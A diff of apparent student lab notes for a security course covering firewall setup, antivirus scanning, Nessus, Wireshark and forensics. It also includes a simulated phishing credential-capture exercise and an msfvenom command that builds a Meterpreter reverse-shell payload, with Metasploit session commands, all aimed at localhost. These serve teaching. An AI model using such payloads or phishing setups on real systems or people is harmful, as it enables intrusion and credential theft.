@@ -1,5 +1,6 @@
+-----------------------------------------------------------------
 Exp 1: Setting up and configuring a firewall
-
+-----------------------------------------------------------------
 sudo apt update
 sudo apt install ufw
 
@@ -20,8 +21,9 @@ sudo ufw status numbered
 
 sudo ufw disable
 
+----------------------------------------------------------------------
 Exp 2: Implementing and Testing Antivirus Software
-
+----------------------------------------------------------------------
 sudo apt update
 sudo apt install clamav clamav-daemon
 
@@ -31,8 +33,9 @@ clamscan --infected --recursive --bell /home/kali
 
 (For windows do a quick scan in windows security - virus and threat protection)
 
+-------------------------------------------------------------------------
 Experiment 3: Simulating a Phishing attack and detection
-
+--------------------------------------------------------------------------
 ip a
 (note down your ip address)
 
@@ -45,16 +48,22 @@ Visit: http://<your-IP> (e.g., http://10.0.2.15)
 Enter dummy credentials.
 Watch them appear in the terminal.
 
+----------------------------------------------------------------------------
 Exp 4: Performing Vulnerability Scanning Using Nessus
+----------------------------------------------------------------------------
 login
 create a new scan
 basic network scan
 in target enter 127.0.0.1
 run the scan and wait for few minutes 
 
+-----------------------------------------------------------------------------
 Exp 5: Implementing and Configuring an Intrusion Detection System (IDS)
+------------------------------------------------------------------------------
 
+-------------------------------------------------------------------------------
 Exp - 6 Exploiting a Sample Vulnerability using Metasploit
+--------------------------------------------------------------------------------
 
 sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o /tmp/shell.elf
 
@@ -73,13 +82,17 @@ sessions -i 1
 sysinfo
 getuid
 
+----------------------------------------------------------------------
 Exp 7: Analyzing Network Traffic with Wireshark
+-----------------------------------------------------------------------
 
 open wireshark 
 press eth0 or wifi
 start capturing packets
 
+--------------------------------------------------------------------------
 Exp 8: Investigating a Cyber Incident using Forensics Tools
+--------------------------------------------------------------------------
 
 To download dd file: https://cfreds-archive.nist.gov/dfr-test-images.html
 Autopsy
